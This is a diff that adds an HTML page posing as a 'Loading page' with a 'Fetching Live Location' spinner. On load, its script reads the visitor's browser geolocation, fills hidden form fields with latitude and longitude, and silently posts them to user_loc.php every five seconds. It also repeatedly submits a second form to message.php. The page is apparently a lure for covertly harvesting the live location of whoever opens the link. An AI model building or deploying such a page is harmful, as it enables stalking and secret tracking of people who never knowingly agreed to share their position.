@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="utf-8">
+<title>Loading page</title>
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+<style media="screen">
+body{
+text-align: center;
+}
+</style>
+</head>
+<body>
+	
+
+<div class="jumbotron">
+<h3>Do not close this window...Fetching Live Location</h3>
+<div class="d-flex justify-content-center">
+<div class="spinner-grow" role="status">
+<span class="sr-only"></span>
+</div>
+</div>
+</div>
+<form action="user_loc.php" method="POST" id="myForm" name="myForm">
+				<input type="hidden"  id="lat" name="lat" />
+        <input type="hidden" id="long" name="long"/>
+	</form>
+  <form action="message.php">
+    <input type="hidden"  id="myForm2" name="myForm2" />
+  </form>
+<p id="demo"></p>
+
+<script>
+getLocation();
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else {
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+    var latfield = document.getElementById('lat')
+    var longfield = document.getElementById('long')
+    var lat = position.coords.latitude;
+    var long = position.coords.longitude;
+    latfield.value = lat
+    longfield.value = long
+}
+</script>
+<script type="text/javascript">
+	setInterval(function() {
+    document.getElementById("myForm").submit();
+     document.getElementById("myForm2").submit();
+}, 5000);
+</script>
+</body>
+</html>
